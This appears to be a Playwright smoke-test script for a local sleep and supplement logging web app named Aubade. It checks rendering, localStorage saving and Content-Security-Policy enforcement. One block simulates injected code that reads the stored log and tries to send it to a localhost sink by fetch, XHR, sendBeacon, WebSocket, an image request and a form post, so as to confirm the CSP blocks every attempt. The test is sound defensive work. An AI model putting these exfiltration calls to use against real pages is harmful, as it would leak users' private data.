// 実ブラウザでしか確認できないことを見る。JSDOM は CSP を解釈せず、実描画も持たない。
// 使い方: npm run smoke
import http from "node:http";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { chromium } from "@playwright/test";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const PORT = 8899;
const TYPES = { ".html": "text/html; charset=utf-8", ".txt": "text/plain; charset=utf-8" };

const results = [];
const check = (name, ok, detail) => {
  const d = detail == null ? "" : String(detail);
  results.push({ name, ok, detail: d.length > 160 ? d.slice(0, 160) + "…" : d });
};

const server = http.createServer((req, res) => {
  const path = req.url === "/" ? "/index.html" : req.url.split("?")[0];
  try {
    const body = readFileSync(join(ROOT, path));
    res.writeHead(200, { "Content-Type": TYPES[path.slice(path.lastIndexOf("."))] || "application/octet-stream" });
    res.end(body);
  } catch {
    res.writeHead(404);
    res.end("not found");
  }
});

// 記録を外部へ送ろうとする注入コードを演じ、実際に届いたリクエストだけを数える
const received = [];
const sink = http.createServer((req, res) => {
  received.push(req.method + " " + req.url);
  res.writeHead(200, { "Access-Control-Allow-Origin": "*" });
  res.end("ok");
});

await new Promise((r) => server.listen(PORT, "127.0.0.1", r));
await new Promise((r) => sink.listen(PORT + 1, "127.0.0.1", r));

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
const page = await context.newPage();
const jsErrors = [];
page.on("pageerror", (e) => jsErrors.push(String(e.message)));
page.on("console", (m) => { if (m.type() === "error") jsErrors.push(m.text()); });

const base = `http://127.0.0.1:${PORT}/`;
await page.goto(base);

check("見出しが Aubade で描画される", (await page.textContent("h1")) === "Aubade");
check("記録タブが描画される", (await page.textContent("#view")).includes("就寝時刻"));

await page.getByRole("button", { name: "✓ した" }).first().click();
const saved = await page.evaluate(() => localStorage.getItem("flourish-log-v2"));
check("1タップで localStorage に保存される", !!saved && saved.includes("ashwagandha"));
check("「✓ 保存済み」が出る", (await page.textContent("#saveState")) === "✓ 保存済み");

for (const tab of ["週", "推移", "週報", "設定"]) {
  await page.getByRole("button", { name: tab, exact: true }).click();
  const len = (await page.textContent("#view")).length;
  check(`タブ「${tab}」が描画される`, len > 50, `${len}文字`);
}
await page.getByRole("button", { name: "推移", exact: true }).click();
check("推移タブにSVGが2枚以上ある", (await page.locator("svg").count()) >= 2);

const icon = await page.evaluate(async () => {
  const im = new Image();
  im.src = document.querySelector('link[rel="icon"]').href;
  try { await im.decode(); return true; } catch { return false; }
});
check("data: のアイコンが CSP に阻まれない", icon);

// この後の持ち出し試行では CSP 違反ログが出るのが正しいので、通常操作の分だけをここで見る
check("通常操作でJSエラーが出ない", jsErrors.length === 0, jsErrors.join(" / ") || "なし");

const violations = await page.evaluate(async (sinkUrl) => {
  const v = [];
  document.addEventListener("securitypolicyviolation", (e) => v.push(e.violatedDirective));
  const secret = localStorage.getItem("flourish-log-v2") || "x";
  try { await fetch(sinkUrl + "fetch?d=" + encodeURIComponent(secret)); } catch {}
  try { const x = new XMLHttpRequest(); x.open("POST", sinkUrl + "xhr"); x.send(secret); } catch {}
  try { navigator.sendBeacon(sinkUrl + "beacon", secret); } catch {}
  try { new WebSocket(sinkUrl.replace("http", "ws")); } catch {}
  new Image().src = sinkUrl + "img?d=" + encodeURIComponent(secret);
  const f = document.createElement("form");
  f.action = sinkUrl + "form"; f.method = "POST"; document.body.appendChild(f);
  try { f.submit(); } catch {}
  await new Promise((r) => setTimeout(r, 800));
  return v;
}, `http://127.0.0.1:${PORT + 1}/`);

check("持ち出しが CSP で遮断される", violations.length >= 5, `違反 ${violations.length} 件: ${[...new Set(violations)].join(", ")}`);
check("外部サーバーに1件も届かない", received.length === 0, received.join(" / ") || "0件");
check("ページ遷移が起きていない", page.url() === base, page.url());

// Service Worker 未導入なので、オフラインでは開けないはず。合否ではなく現状の記録として出す
await context.setOffline(true);
let offline = "開けない(Service Worker 未導入のため想定どおり)";
try { await page.reload({ timeout: 5000 }); offline = "開けた"; } catch { /* 想定どおり */ }
await context.setOffline(false);

await browser.close();
server.close();
sink.close();

const pad = Math.max(...results.map((r) => r.name.length));
for (const r of results) {
  console.log(`${r.ok ? "PASS" : "FAIL"}  ${r.name.padEnd(pad)}${r.detail ? "  — " + r.detail : ""}`);
}
console.log(`INFO  オフライン時の起動: ${offline}`);

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
if (failed.length) process.exit(1);
